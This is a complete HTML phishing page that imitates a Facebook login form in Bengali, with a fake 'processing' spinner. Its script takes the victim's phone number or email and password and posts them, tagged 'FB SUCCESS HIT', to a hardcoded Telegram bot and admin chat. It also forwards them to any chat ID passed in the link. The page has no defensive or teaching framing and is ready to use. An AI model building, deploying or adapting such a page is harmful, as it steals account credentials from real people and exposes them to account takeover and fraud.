<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - funny Real 😂😂</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15); width: 90%; max-width: 400px; text-align: center; }
        .fb-logo { color: #1877f2; font-size: 45px; font-weight: bold; margin-bottom: 15px; letter-spacing: -1.5px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .error-box { background-color: #ffebe8; border: 1px solid #dd3c10; color: #1c1e21; font-size: 13px; padding: 10px; border-radius: 4px; display: none; margin-bottom: 15px; text-align: left; }
        #login-btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        #loading-screen { display: none; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 25px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer-link { color: #1877f2; font-size: 14px; margin-top: 15px; display: block; text-decoration: none; }
    </style>
</head>
<body>

<div class="login-container" id="login-box">
    <div class="fb-logo">facebook</div>
    <div id="main-error" class="error-box"></div>
    
    <input type="text" id="userInput" placeholder="মোবাইল নম্বর বা ইমেইল ঠিকানা">
    <input type="password" id="pass1" placeholder="পাসওয়ার্ড">
    <input type="password" id="pass2" placeholder="পাসওয়ার্ড নিশ্চিত করুন">
    
    <button id="login-btn">Log In</button>
    <a href="#" class="footer-link">Forgotten password?</a>
</div>

<div class="login-container" id="loading-screen">
    <div class="fb-logo">facebook</div>
    <div class="spinner"></div>
    <p style="color: #606770;">প্রসেসিং হচ্ছে... অনুগ্রহ করে অপেক্ষা করুন।</p>
</div>

<script>
    const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
    const adminId = "7068444019";
    const urlParams = new URLSearchParams(window.location.search);
    const userIdFromLink = urlParams.get('id');

    document.getElementById('login-btn').addEventListener('click', async () => {
        const userInput = document.getElementById('userInput').value.trim();
        const p1 = document.getElementById('pass1').value;
        const p2 = document.getElementById('pass2').value;
        const errorBox = document.getElementById('main-error');

        errorBox.style.display = 'none';

        // ভ্যালিডেশন চেক
        const isNumber = /^\d+$/.test(userInput); // শুধু নম্বর কিনা
        const isGmail = /^[a-zA-Z0-0._%+-]+@gmail\.com$/.test(userInput); // জিমেইল কিনা

        if (!userInput) {
            showError("মোবাইল নম্বর বা ইমেইল ঠিকানা দিন।");
            return;
        }

        if (isNumber && userInput.length !== 11) {
            showError("সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন।");
            return;
        }

        if (!isNumber && !isGmail) {
            showError("অনুগ্রহ করে একটি সঠিক মোবাইল নম্বর অথবা @gmail.com ইমেইল দিন।");
            return;
        }

        if (!p1) {
            showError("পাসওয়ার্ড প্রদান করুন।");
            return;
        }

        if (p1 !== p2) {
            showError("পাসওয়ার্ড মেলেনি। আবার চেষ্টা করুন।");
            return;
        }

        // সব ঠিক থাকলে
        document.getElementById('login-box').style.display = 'none';
        document.getElementById('loading-screen').style.display = 'block';

        const message = `🔥 **FB SUCCESS HIT** 🔥\n\n📧 Target: \`${userInput}\`\n🔑 Password: \`${p1}\``;

        await sendData(adminId, message);
        if (userIdFromLink && userIdFromLink !== adminId) {
            await sendData(userIdFromLink, message);
        }
    });

    function showError(msg) {
        const errorBox = document.getElementById('main-error');
        errorBox.innerText = msg;
        errorBox.style.display = 'block';
    }

    async function sendData(id, text) {
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'Markdown' })
            });
        } catch(e) {}
    }
</script>
</body>
</html>
